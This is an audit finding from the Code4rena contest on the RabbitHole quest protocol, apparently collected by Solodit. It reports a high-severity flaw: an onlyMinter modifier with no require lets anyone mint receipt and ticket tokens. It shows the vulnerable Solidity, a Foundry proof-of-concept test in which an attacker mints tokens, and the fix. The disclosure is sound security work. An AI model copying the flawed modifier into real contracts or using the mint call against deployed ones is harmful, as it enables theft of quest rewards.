---
# Core Classification
protocol: RabbitHole
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 8850
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2023-01-rabbithole-quest-protocol-contest
source_link: https://code4rena.com/reports/2023-01-rabbithole
github_link: https://github.com/code-423n4/2023-01-rabbithole-findings/issues/608

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 1.00
financial_impact: high

# Scoring
quality_score: 5
rarity_score: 4

# Context Tags
tags:

protocol_categories:
  - dexes
  - cdp
  - services
  - cross_chain
  - leveraged_farming

# Audit Details
report_date: unknown
finders_count: 59
finders:
  - vanko1
  - 0xMirce
  - millersplanet
  - tsvetanovv
  - frankudoags
---

## Vulnerability Title

[H-01] Bad implementation in minter access control for RabbitHoleReceipt and RabbitHoleTickets contracts

### Overview


This bug report is about two contracts, `RabbitHoleReceipt` and `RabbitHoleTickets`, that contain a `mint` function protected by a `onlyMinter` modifier. The modifier is flawed as it does not contain a require or revert statement, meaning that any account can mint any number of tokens. This is a critical issue as it allows attackers to mint receipt tokens for any quest and claim the rewards.

The bug can be demonstrated with the provided proof-of-concept code. The recommendation is to modify the `onlyMinter` modifier so that it requires that the caller is the `minterAddress` and reverts the call if this condition is not met.

### Original Finding Content

## Lines of code

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50


## Vulnerability details

Both `RabbitHoleReceipt` and `RabbitHoleTickets` contracts define a `mint` function that is protected by a `onlyMinter` modifier:

RabbitHoleReceipt:

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104

```solidity
function mint(address to_, string memory questId_) public onlyMinter {
    _tokenIds.increment();
    uint newTokenID = _tokenIds.current();
    questIdForTokenId[newTokenID] = questId_;
    timestampForTokenId[newTokenID] = block.timestamp;
    _safeMint(to_, newTokenID);
}
```

RabbitHoleTickets:

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85

```solidity
function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {
    _mint(to_, id_, amount_, data_);
}
```

However, in both cases the modifier implementation is flawed as there isn't any check for a require or revert, the comparison will silently return false and let the execution continue:

```solidity
modifier onlyMinter() {
    msg.sender == minterAddress;
    _;
}
```

## Impact

Any account can mint any number of `RabbitHoleReceipt` and `RabbitHoleTickets` tokens.

This represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.

## PoC

The following test demonstrates the issue.

```solidity
contract AuditTest is Test {
    address deployer;
    uint256 signerPrivateKey;
    address signer;
    address royaltyRecipient;
    address minter;
    address protocolFeeRecipient;

    QuestFactory factory;
    ReceiptRenderer receiptRenderer;
    RabbitHoleReceipt receipt;
    TicketRenderer ticketRenderer;
    RabbitHoleTickets tickets;
    ERC20 token;

    function setUp() public {
        deployer = makeAddr("deployer");
        signerPrivateKey = 0x123;
        signer = vm.addr(signerPrivateKey);
        vm.label(signer, "signer");
        royaltyRecipient = makeAddr("royaltyRecipient");
        minter = makeAddr("minter");
        protocolFeeRecipient = makeAddr("protocolFeeRecipient");

        vm.startPrank(deployer);

        // Receipt
        receiptRenderer = new ReceiptRenderer();
        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();
        receipt = RabbitHoleReceipt(
            address(new ERC1967Proxy(address(receiptImpl), ""))
        );
        receipt.initialize(
            address(receiptRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // factory
        QuestFactory factoryImpl = new QuestFactory();
        factory = QuestFactory(
            address(new ERC1967Proxy(address(factoryImpl), ""))
        );
        factory.initialize(signer, address(receipt), protocolFeeRecipient);
        receipt.setMinterAddress(address(factory));

        // tickets
        ticketRenderer = new TicketRenderer();
        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();
        tickets = RabbitHoleTickets(
            address(new ERC1967Proxy(address(ticketsImpl), ""))
        );
        tickets.initialize(
            address(ticketRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // ERC20 token
        token = new ERC20("Mock ERC20", "MERC20");
        factory.setRewardAllowlistAddress(address(token), true);

        vm.stopPrank();
    }
    
    function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {
        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);

        // Anyone can freely mint RabbitHoleReceipt
        string memory questId = "a quest";
        receipt.mint(attacker, questId);
        assertEq(receipt.balanceOf(attacker), 1);

        // Anyone can freely mint RabbitHoleTickets
        uint256 tokenId = 0;
        tickets.mint(attacker, tokenId, 1, "");
        assertEq(tickets.balanceOf(attacker, tokenId), 1);

        vm.stopPrank();
    }
}
```

## Recommendation

The modifier should require that the caller is the `minterAddress` in order to revert the call in case this condition doesn't hold.

```solidity
modifier onlyMinter() {
    require(msg.sender == minterAddress);
    _;
}
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 5/5 |
| Rarity Score | 4/5 |
| Audit Firm | Code4rena |
| Protocol | RabbitHole |
| Report Date | N/A |
| Finders | vanko1, 0xMirce, millersplanet, tsvetanovv, frankudoags, usmannk, Timenov, SovaSlava, vagrant, mookimgo, Cryptor, rbserver, c3phas, DimitarDimitrov, adriro, Kenshin, AkshaySrivastav, btk, Josiah, codeislight, Awesome, Deivitto, shark, RaymondFam, Aymen0909, UdarTeam, trustindistrust, hansfriese, pfapostol, Jayus, sakshamguruji, pavankv, prestoncodes, oberon, luxartvinsec, petersspetrov, fellows, Garrett, paspe, 7siech, ElKu, KrisApostolov, gzeon, 0xMAKEOUTHILL, thekmj, navinavu, xAriextz, AlexCzm, yosuke, amaechieth |

### Source Links

- **Source**: https://code4rena.com/reports/2023-01-rabbithole
- **GitHub**: https://github.com/code-423n4/2023-01-rabbithole-findings/issues/608
- **Contest**: https://code4rena.com/contests/2023-01-rabbithole-quest-protocol-contest

### Keywords for Search

`vulnerability`

